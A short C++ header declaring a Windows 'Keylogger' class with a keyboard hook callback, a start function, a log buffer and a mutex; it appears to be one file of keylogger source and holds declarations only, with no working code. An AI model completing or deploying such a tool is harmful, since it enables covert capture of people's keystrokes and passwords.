#pragma once
#include<string>
#include <Windows.h>

class Keylogger
{
public:
	static std::string GetWindowsText();
	static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
	static void StartKeylogger();
	static bool KeyloggerEnabled;
	static HHOOK g_hook;
	static std::string g_logs;
	static HANDLE mutex;
};

